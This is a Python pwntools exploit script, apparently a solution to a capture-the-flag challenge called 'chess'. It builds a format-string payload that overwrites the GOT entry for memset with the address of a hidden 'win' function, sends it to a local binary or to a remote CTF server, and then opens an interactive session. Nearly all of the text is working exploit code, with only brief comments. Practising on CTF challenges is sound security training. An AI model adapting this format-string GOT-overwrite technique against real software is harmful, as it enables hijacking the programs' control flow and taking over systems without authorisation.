#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chess')
binary.symbols['win'] = 0x4011c2

if args.REMOTE:
	p = remote('challenges.ctfd.io', 30458)
else:
	p = process(binary.path)

# manually from stack
offset = 22

# copied from screen
s = '''
Congratulations blah! Your answer was correct!

Your winning move was:

'''

# the 4 spaces after Ra1 was determined from the stack to align stack
# must be spaces for scanf
payload  = b'Ra1    '
payload += b'%' + str((binary.sym.win & 0xFFFF) - len(s) - len(payload)).rjust(6,'0').encode() + b'c'
payload += b'%' + str(offset + 2).rjust(4,'0').encode() + b'$hn'
payload += p64(binary.got.memset)

p.sendlineafter('>> ','1')
p.sendlineafter('>> ','blah')
p.sendlineafter('>> ',payload)

# take out the trash
null = payload.find(b'\x00')
log.info('null loc: ' + str(null))
p.recvuntil(payload[null-2:null])

p.interactive()
